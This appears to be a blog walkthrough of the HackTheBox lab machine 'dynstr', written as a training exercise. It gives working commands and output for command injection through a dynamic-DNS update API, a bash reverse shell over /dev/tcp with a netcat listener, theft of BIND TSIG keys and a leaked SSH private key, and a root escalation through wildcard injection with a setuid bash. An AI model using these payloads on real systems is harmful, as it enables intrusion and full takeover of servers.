---
title: "Walk-through of dynstr from HackTHeBox"
header:
  teaser: /assets/images/2021-10-01-16-14-45.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
---

## Machine Information

![dynstr](/assets/images/2021-10-01-16-14-45.png)

****STILL NEED TO SORT THIS****
dynstr is rated as a medium machine on HackTheBox. We start with a static website for a Dynamic DNS service, which hides several hidden folders. With recursive scanning using gobuster we discover an API that we can interactive with. After a lengthy investigation we find a way to catch a reverse shell. A carelessly left DNS secret key file allows us to add our attacker IP and SSH in. From there the path to root is achieved by abusing a badly written script to add a sticky bit to bash.

<!--more-->

Skills required are web and OS enumeration. Skills learned are manipulating DNS services and exploiting scripts.


| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - dynstr](https://www.hackthebox.eu/home/machines/profile/352) |
| Machine Release Date | 12th June 2021 |
| Date I Completed It | 6th October 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.244 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/dynstr]
└─# nmap -p$ports -sC -sV -oA dynstr 10.10.10.244
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's start with port 80:

![dynstr](/assets/images/2021-10-01-16-30-54.png)

We find a static website about dynamic DNS, there looks to be some useful information though:

![dynstr-services](/assets/images/2021-10-01-16-34-00.png)

Domains and credentials, make a note of those. The Find Us section has another domain:

![dynstr-find-us](/assets/images/2021-10-01-16-36-31.png)

Not a lot else to find here so try brute force URIs:

```sh
┌──(root💀kali)-[~/htb/dynstr]
└─# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dyna.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dyna.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/10/01 16:39:49 Starting gobuster in directory enumeration mode
===============================================================
http://dyna.htb/assets               (Status: 301) [Size: 305] [--> http://dyna.htb/assets/]
http://dyna.htb/nic                  (Status: 301) [Size: 302] [--> http://dyna.htb/nic/]  
===============================================================
2021/10/01 16:48:43 Finished
===============================================================
```

We find a directory called nic, lets search some more:

```text
┌──(root💀kali)-[~]
└─# gobuster -t 100 dir -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dyna.htb/nic
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dyna.htb/nic
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/10/01 16:40:43 Starting gobuster in directory enumeration mode
===============================================================
http://dyna.htb/nic/update               (Status: 200) [Size: 8]
===============================================================
2021/10/01 16:49:40 Finished
===============================================================
```

## API Investigation

Ok, inside nic we find a directory called update. We can try the URL with cURL:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# curl "http://dyna.htb/nic/update"
badauth
```

After some searching I found [this](https://www.dynu.com/DynamicDNS/IP-Update-Protocol) article which tells us what badauth means:

```text
This response code is returned in case of a failed authentication for the 'request'. Please note that sending across an invalid parameter such as an unknown domain name can also result in this 'response code'
```

Reading this article fully shows how the API works, with this section being the important part:

```text
GET /nic/update?myip=198.144.117.32 HTTP/1.1
Host: api.dynu.com
Authorization: Basic [BASE64-ENCODED-USERNAME:PASSWORD-PAIR]
User-Agent: [DEVICE-MODEL-MAKE-VERSION]
```

Note it says Authorization is Basic and uses base64 encoded username and password. [This](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) Mozilla docs explains that more fully. I also found [this](https://www.noip.com/integrate/request) article which helped with the format of the URL and parameters.

We can try this with cURL:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# curl "http://dyna.htb/nic/update?myip=10.10.14.214"
badauth

┌──(root💀kali)-[~/htb/dynstr]
└─# curl "http://dyna.htb/nic/update?myip=10.10.14.214&hostname=dyna.htb"
badauth
```

So following the dynu guide I've used my Kali IP, then I tried it adding the dyna.htb hostname. Now we need to try basic authorization, and we have the creds found earlier on the site so first we base64 encode them:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# echo -n "dynadns:sndanyd" | base64 -w 0
ZHluYWRuczpzbmRhbnlk
```

Now we can use these creds:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# curl "http://dyna.htb/nic/update?myip=10.10.14.214&hostname=dyna.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk"
911 [wrngdom: htb]
```

Now we get a different error. Probably means wrong domain, let's add the other domains we found on the website to our hosts file:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# echo "10.10.10.244 dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb" >> /etc/hosts
```

Now try a different domain:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# curl "http://dyna.htb/nic/update?myip=10.10.14.214&hostname=no-ip.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk"       
911 [wrngdom: htb]
```

I played around some here, eventually trying to add a subdomain which worked:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# curl "http://dyna.htb/nic/update?myip=10.10.14.214&hostname=pencer.no-ip.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk"
good 10.10.14.214
```

Now we're getting somewhere. We can do a simple test to see if that subdomain can contain commands:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# echo 'ping -c4 10.10.14.214' | base64                                                                        2 ⨯
cGluZyAtYzQgMTAuMTAuMTQuMjE0Cg==
```

Here we've base64 encoded a ping back to us. Now we need to get the server to decode this payload and execute. This let's us see if it is arbitrarily executing the subdomain portion. We can test first that our logic works locally:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# echo cGluZyAtYzQgMTAuMTAuMTQuMjE0Cg==  | base64 -d | bash
PING 10.10.14.214 (10.10.14.214) 56(84) bytes of data.
64 bytes from 10.10.14.214: icmp_seq=1 ttl=64 time=0.011 ms
64 bytes from 10.10.14.214: icmp_seq=2 ttl=64 time=0.057 ms
64 bytes from 10.10.14.214: icmp_seq=3 ttl=64 time=0.018 ms
64 bytes from 10.10.14.214: icmp_seq=4 ttl=64 time=0.022 ms
```

Here i've called the bas64 encoded ping back and then decoded it and passed to bash, which executed it and we see the ping on our local Kali.

Now we can test remotely by starting tcpdump on Kali to listen for the ping from the box. Last thing to do is URL endode our payload to get rid of the characters that aren't valid:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# python3 -c "import urllib.parse; print(urllib.parse.quote('\`echo cGluZyAtYzQgMTAuMTAuMTQuMjE0Cg==  | base64 -d | bash\`'))"
%60echo%20cGluZyAtYzQgMTAuMTAuMTQuMjE0Cg%3D%3D%20%20%7C%20base64%20-d%20%7C%20bash%60
```

This final payload can be added as a subdomain like before:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# curl "http://dyna.htb/nic/update?myip=10.10.14.214&hostname=%60echo%20cGluZyAtYzQgMTAuMTAuMTQuMjE0Cg%3D%3D%20%20%7C%20base64%20-d%20%7C%20bash%60.no-ip.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk"
911 [nsupdate failed]
```

We get an update failed, but if you look at tcpdump that is listening we see it received the pings:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# tcpdump icmp -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:12:00.899981 IP dyna.htb > 10.10.14.214: ICMP echo request, id 4, seq 1, length 64
11:12:00.899991 IP 10.10.14.214 > dyna.htb: ICMP echo reply, id 4, seq 1, length 64
11:12:01.901063 IP dyna.htb > 10.10.14.214: ICMP echo request, id 4, seq 2, length 64
11:12:01.901072 IP 10.10.14.214 > dyna.htb: ICMP echo reply, id 4, seq 2, length 64
11:12:02.902575 IP dyna.htb > 10.10.14.214: ICMP echo request, id 4, seq 3, length 64
11:12:02.902585 IP 10.10.14.214 > dyna.htb: ICMP echo reply, id 4, seq 3, length 64
11:12:03.904442 IP dyna.htb > 10.10.14.214: ICMP echo request, id 4, seq 4, length 64
11:12:03.904470 IP 10.10.14.214 > dyna.htb: ICMP echo reply, id 4, seq 4, length 64
11:12:03.933087 IP dyna.htb > 10.10.14.214: ICMP echo request, id 5, seq 1, length 64
11:12:03.933097 IP 10.10.14.214 > dyna.htb: ICMP echo reply, id 5, seq 1, length 64
11:12:04.934231 IP dyna.htb > 10.10.14.214: ICMP echo request, id 5, seq 2, length 64
11:12:04.934242 IP 10.10.14.214 > dyna.htb: ICMP echo reply, id 5, seq 2, length 64
11:12:05.935225 IP dyna.htb > 10.10.14.214: ICMP echo request, id 5, seq 3, length 64
11:12:05.935234 IP 10.10.14.214 > dyna.htb: ICMP echo reply, id 5, seq 3, length 64
11:12:06.935920 IP dyna.htb > 10.10.14.214: ICMP echo request, id 5, seq 4, length 64
11:12:06.935930 IP 10.10.14.214 > dyna.htb: ICMP echo reply, id 5, seq 4, length 64
```

## Reverse Shell

Excellent. We've proved we can execute commands on the server and communicate back to Kali. Now it's time for a reverse shell, I just used a classic pentestmonkey one, first bas64 encode:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# echo 'bash -i >& /dev/tcp/10.10.14.214/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTQvNDQ0NCAwPiYxCg==
```

Put that encoded string in the same command as before to echo, decode then pass to bash. URL encode it:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# python3 -c "import urllib.parse; print(urllib.parse.quote('\`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTQvNDQ0NCAwPiYxCg==  | base64 -d | bash\`'))"
%60echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMTQvNDQ0NCAwPiYxCg%3D%3D%20%20%7C%20base64%20-d%20%7C%20bash%60
```

Now use cURL like before to pass to the box, make sure you have a netcat listener waiting to catch the shell:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# curl "http://dyna.htb/nic/update?myip=10.10.14.214&hostname=%60echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMTQvNDQ0NCAwPiYxCg%3D%3D%20%20%7C%20base64%20-d%20%7C%20bash%60.no-ip.htb" -H "Authorization: Basic ZHluYWRuczpzbmRhbnlk"
```

Switch over and we've got out initial shell connected:

```text
┌──(root💀kali)-[~]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.214] from (UNKNOWN) [10.10.10.244] 51504
bash: cannot set terminal process group (795): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dynstr:/var/www/html/nic$ 
```

## Update Script

We are connected as www-data, so first let's see what is in our home folder:

```text
www-data@dynstr:/var/www/html/nic$ ls -ls
0 -rw-r--r-- 1 root root    0 Mar 12  2021 index.html
4 -rw-r--r-- 1 root root 1110 Mar 13  2021 update

www-data@dynstr:/var/www/html/nic$ file update
update: PHP script, ASCII text

www-data@dynstr:/var/www/html/nic$ cat update
<?php
  // Check authentication
  if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']))      { echo "badauth\n"; exit; }
  if ($_SERVER['PHP_AUTH_USER'].":".$_SERVER['PHP_AUTH_PW']!=='dynadns:sndanyd') { echo "badauth\n"; exit; }

  // Set $myip from GET, defaulting to REMOTE_ADDR
  $myip = $_SERVER['REMOTE_ADDR'];
  if ($valid=filter_var($_GET['myip'],FILTER_VALIDATE_IP))                       { $myip = $valid; }

  if(isset($_GET['hostname'])) {
    // Check for a valid domain
    list($h,$d) = explode(".",$_GET['hostname'],2);
    $validds = array('dnsalias.htb','dynamicdns.htb','no-ip.htb');
    if(!in_array($d,$validds)) { echo "911 [wrngdom: $d]\n"; exit; }
    // Update DNS entry
    $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
    system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
    // Return good or 911
    if (!$retval) {
      echo "good $myip\n";
    } else {
      echo "911 [nsupdate failed]\n"; exit;
    }
  } else {
    echo "nochg $myip\n";
  }
?>
```

The update file is what we interacted with to get our initial shell. The interesting part of it is here:

```text
// Update DNS entry
    $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
    system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
```

## Secret Keys

This is where the command to be executed is formed, we can see a path to a file ddns.key. Looking in that folder:

```text
www-data@dynstr:/home/bindmgr/.ssh$ cd /etc/bind
www-data@dynstr:/etc/bind$ ls -l
-rw-r--r-- 1 root root  237 Dec 17  2019 db.0
-rw-r--r-- 1 root root  271 Dec 17  2019 db.127
-rw-r--r-- 1 root root  237 Dec 17  2019 db.255
-rw-r--r-- 1 root root  353 Dec 17  2019 db.empty
-rw-r--r-- 1 root root  270 Dec 17  2019 db.local
-rw-r--r-- 1 root bind  100 Mar 15  2021 ddns.key
-rw-r--r-- 1 root bind  101 Mar 15  2021 infra.key
<SNIP>
```

We see another key in there as well, let's check them out:

```text
www-data@dynstr:/etc/bind$ cat ddns.key
key "ddns-key" {
        algorithm hmac-sha256;
        secret "K8VF/NCIy5K4494l2w09Kib7oEcjdjdF7m4dXSI8vhI=";
};

www-data@dynstr:/etc/bind$ cat infra.key
key "infra-key" {
        algorithm hmac-sha256;
        secret "7qHH/eYXorN2ZNUM1dpLie5BmVstOw55LgEeacJZsao=";
};
```

## Trace File

We know this box is based on working with DNS, so let's keep those files in mind for later.

Checking users we have two, bindmgr and dyna, let's look at bindmgr:

```text
www-data@dynstr:/var/www/html/nic$ ls -lsa /home/bindmgr
ls -lsa /home/bindmgr
0 lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15  2021 .bash_history -> /dev/null
4 -rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
4 drwx------ 2 bindmgr bindmgr 4096 Mar 13  2021 .cache
4 -rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
4 drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13  2021 .ssh
4 -rw-rw-r-- 1 bindmgr bindmgr    2 Oct  2 19:46 .version
4 drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13  2021 support-case-C62796521
4 -r-------- 1 bindmgr bindmgr   33 Oct  1 13:20 user.txt
```

Support case sounds interesting, let's look in there:

```text
www-data@dynstr:/home/bindmgr$ cd support-case-C62796521
www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -l
-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13  2021 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13  2021 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13  2021 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13  2021 strace-C62796521.txt
```

Looking at the four files the command-output on shows us this:

```text
www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat command-output-C62796521.txt
<SNIP>
* Connected to sftp.infra.dyna.htb (192.168.178.27) port 22 (#0)
* SSH MD5 fingerprint: c1c2d07855aa0f80005de88d254a6db8
* SSH authentication methods available: publickey,password
* Using SSH public key file '/home/bindmgr/.ssh/id_rsa.pub'
* Using SSH private key file '/home/bindmgr/.ssh/id_rsa'
```

It mentions sftp.infra.dyna.htb, which must relate the the infra.key we found earlier. It also shows that the ssh keys held in the users home .ssh folder where used to connect. Looking at the strace file we find this amongst the long output:

```text
www-data@dynstr:/home/bindmgr/support-case-C62796521$ cat strace-C62796521.txt
<SNIP>
15123 getrusage(RUSAGE_SELF, {ru_utime={tv_sec=0, tv_usec=31761}, ru_stime={tv_sec=0, tv_usec=36298}, ...}) = 0
15123 clock_gettime(CLOCK_PROCESS_CPUTIME_ID, {tv_sec=0, tv_nsec=68154027}) = 0
15123 openat(AT_FDCWD, "/home/bindmgr/.ssh/id_rsa", O_RDONLY) = 5
15123 fstat(5, {st_mode=S_IFREG|0600, st_size=1823, ...}) = 0
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAE
bm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37
HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwi
OM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\
nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbD
5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIO
CJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
15123 read(5, "", 4096)                 = 0
15123 close(5)                          = 0
15123 write(2, "*", 1)                  = 1
15123 write(2, " ", 1)                  = 1
15123 write(2, "SSH public key authentication failed: Callback returned error\n", 62) = 62
15123 getpid()                          = 15123
15123 getrusage(RUSAGE_SELF, {ru_utime={tv_sec=0, tv_usec=32028}, ru_stime={tv_sec=0, tv_usec=36604}, ...}) = 0
15123 clock_gettime(CLOCK_PROCESS_CPUTIME_ID, {tv_sec=0, tv_nsec=68639024}) = 0
```

## SSH Private Key

In the middle of the file we see a SSH private key, we can copy that to a file on Kali for later:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# echo '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk<SNIP>+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n' | sed 's/:/\n/g'
-----BEGIN OPENSSH PRIVATE KEY-----
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
<SNIP>
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

After looking through the files in that folder, now I look in the .ssh folder:

```text
www-data@dynstr:/var/www/html/nic$ ls -lsa /home/bindmgr/.ssh
ls -lsa /home/bindmgr/.ssh
total 24
4 drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13  2021 .
4 drwxr-xr-x 5 bindmgr bindmgr 4096 Oct  2 19:46 ..
4 -rw-r--r-- 1 bindmgr bindmgr  419 Mar 13  2021 authorized_keys
4 -rw------- 1 bindmgr bindmgr 1823 Mar 13  2021 id_rsa
4 -rw-r--r-- 1 bindmgr bindmgr  395 Mar 13  2021 id_rsa.pub
4 -rw-r--r-- 1 bindmgr bindmgr  444 Mar 13  2021 known_hosts
```

We see we haven't got access to the id_rsa file in here, but having already found a copy of it in the support folder we don't need it. Looking in authorized_keys:

```text
www-data@dynstr:/var/www/html/nic$ cat /home/bindmgr/.ssh/authorized_keys
cat /home/bindmgr/.ssh/authorized_keys
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```

We see an unusual from line at the start on the file. I found [this](https://superuser.com/questions/1229981/openssh-from-authorization-option-working-only-with-ip-addresses-not-hostname) which explains:

```text
Specifies whether sshd(8) should look up the remote host name, and to check that the resolved host name for the remote IP address maps back to the very same IP address.
```

## NS Update

Everything now falls in to place. We have the public and private key for the bindmgr user. We have authorized_key file that requires us to connect from the infra.dyna.htb zone. We have the infra.key file containing the secret needed to perform an nsupdate.

So we just need to add our Kali IP in to the infra DNS zone so we can connect via SSH. To do this we use [nsupdate](https://linux.die.net/man/8/nsupdate) which we saw earlier in the update script:

```text
www-data@dynstr:/etc/bind$ nsupdate -k infra.key
nsupdate -k infra.key
> update add pencer.infra.dyna.htb 86400 A 10.10.14.214
> 
> update add 214.14.10.10.in-addr.arpa 86400 PTR pencer.infra.dyna.htb
> show
Outgoing update query:
;; ->>HEADER<<- opcode: UPDATE, status: NOERROR, id:      0
;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
;; UPDATE SECTION:
214.14.10.10.in-addr.arpa. 86400 IN     PTR     pencer.infra.dyna.htb.

> send
> quit
```

## User Flag

Switch back to Kali and we should be able to login using the private key we copied across earlier:

```text
┌──(root💀kali)-[~/htb/dynstr]
└─# ssh -i id_rsa bindmgr@dyna.htb
The authenticity of host 'dyna.htb (10.10.10.244)' can't be established.
ECDSA key fingerprint is SHA256:443auWJe5iDH5JBCq/9ir4ToxZ5PTzTv7XvRSYrz0ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dyna.htb,10.10.10.244' (ECDSA) to the list of known hosts.
Last login: Tue Jun  8 19:19:17 2021 from 6146f0a384024b2d9898129ccfee3408.infra.dyna.htb
bindmgr@dynstr:~$ 
```

We can grab the user flag we saw earlier now:

```text
bindmgr@dynstr:~$ cat user.txt 
<HIDDEN>
```

## Bindmgr Script

Ok, first a few things to look at, if nothing obvious stands out we can grab LinPEAS. I usally check sudo first:

```text
bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

That was the right guess on this box!

Let's look what this bindmgr.sh script does. This first section sets the paths and checks if a file called .version exists in the $BINDMGR_DIR folder:

```sh
bindmgr@dynstr:~$ cat /usr/local/bin/bindmgr.sh
#!/usr/bin/bash
<SNIP>
BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi
```

Now it creates a list of all files in named.bindmgr folder:

```sh
# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done
```

This is the vulnerable bit. Here it is copying all the files to /etc/bind/named.bindmgr, but it uses * so we can put any file in and it will append to a single cp copy:

```sh
# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/
```

After that the script just tidies up. Let's create a file called .version with a number one as the contents, then run the script and see what happens:

```text
bindmgr@dynstr:~$ cd /dev/shm

bindmgr@dynstr:/dev/shm$ echo "1" > .version

bindmgr@dynstr:/dev/shm$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: cannot stat '*': No such file or directory
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/*: file not found

bindmgr@dynstr:/dev/shm$ ls -lsa /etc/bind/named.bindmgr/
4 -rw-r--r-- 1 root bind    2 Oct  6 23:11 .version
```

## Stage Files

OK, so we created a file called .version in /dev/shm, ran the script as root, then we see the file is copied to /etc/bind/named.bindmgr and is owned by root. We know the * in the script means it will take all files it finds in the current folder and create a single command line from it. We can take advantage of this by staging files that will give us a bash we can run as our user in the context of root.

First we want to copy bash in to our working folder /dev/shm and set the SETUID bit on it. SETUID is defined as:

```text
s (setuid) means set user ID upon execution. If setuid bit turned on a file, user executing that executable file gets the permissions of the individual or group that owns the file.
```

Then we need to create another file called **--preserve=mode**, it doesn't need any contents. This is because when the script copies bash it will remove the setuid bit we've just set, which is explained [here](https://man7.org/linux/man-pages/man1/cp.1.html).

Let's do it:

```text
bindmgr@dynstr:/tmp/tmp$ cp /bin/bash .
bindmgr@dynstr:/tmp/tmp$ chmod +s bash
bindmgr@dynstr:/tmp/tmp$ echo "" > "--preserve=mode"

bindmgr@dynstr:/dev/shm$ ls -lsa
total 1164
   0 drwxrwxrwt  2 root    root        100 Oct  6 23:21  .
   0 drwxr-xr-x 17 root    root       3940 Oct  6 20:57  ..
1156 -rwsr-sr-x  1 bindmgr bindmgr 1183448 Oct  6 23:20  bash
   4 -rw-rw-r--  1 bindmgr bindmgr       1 Oct  6 23:21 '--preserve=mode'
   4 -rw-rw-r--  1 bindmgr bindmgr       2 Oct  6 23:10  .version

bindmgr@dynstr:/dev/shm$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: cannot stat '*': No such file or directory
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/*: file not found

bindmgr@dynstr:/dev/shm$ cd /etc/bind/named.bindmgr
bindmgr@dynstr:/etc/bind/named.bindmgr$ ls -lsa
total 1168
   4 drwxr-sr-x 2 root bind    4096 Oct  6 23:21 .
   4 drwxr-sr-x 3 root bind    4096 Oct  6 23:21 ..
1156 -rwsr-sr-x 1 root bind 1183448 Oct  6 23:21 bash
   4 -rw-rw-r-- 1 root bind       2 Oct  6 23:21 .version
```

## Root Flag

It worked and we can see bash has been copied to the folder, it's owned by root but still has the s bit set so we can execute it as our user:

```text
bindmgr@dynstr:/etc/bind/named.bindmgr$ ./bash -p
bash-5.0# whoami
root
bash-5.0# id
uid=1001(bindmgr) gid=1001(bindmgr) euid=0(root) egid=117(bind) groups=117(bind),1001(bindmgr)
bash-5.0# cat /root/root.txt
<HIDDEN>
```

That was a pretty tricky box for me, so hopefully I've done it justice with this walk-through.

All done. See you next time.
